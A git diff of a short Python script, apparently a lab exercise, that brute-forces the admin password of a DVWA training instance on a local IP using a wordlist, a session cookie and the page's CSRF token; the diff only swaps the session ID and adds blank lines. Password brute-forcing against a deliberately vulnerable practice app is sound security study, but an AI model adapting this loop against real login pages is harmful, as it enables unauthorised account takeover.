@@ -9,7 +9,7 @@ wordlistDosya = dosya.read().split("\n")
 for i in wordlistDosya:
 	cookies = {
 		'security': 'high',
-		'PHPSESSID':'0f3d2eed02f1871611b7a6ef1cb8cb56'
+		'PHPSESSID':'ae62c3c9c8a7143de0cd495077a22428'
 	}
 
 	url = 'http://192.168.182.131/dvwa2/vulnerabilities/brute/index.php'
@@ -26,7 +26,9 @@ for i in wordlistDosya:
 	url = "http://192.168.182.131/dvwa2/vulnerabilities/brute/index.php?username=admin&password="+ sifreler +"&Login=Login&user_token="+token
 	istek = requests.get(url, cookies=cookies)
 
+
 	if(str(istek.content).find("Username and/or password incorrect.") == -1):
 		print("\r\n\r\n-------------\r\n[***] Şifre :", i)
 		break
 	print("[*] Denenen ==> ?username=admin&password="+ sifreler +"&Login=Login&user_token="+token)
+
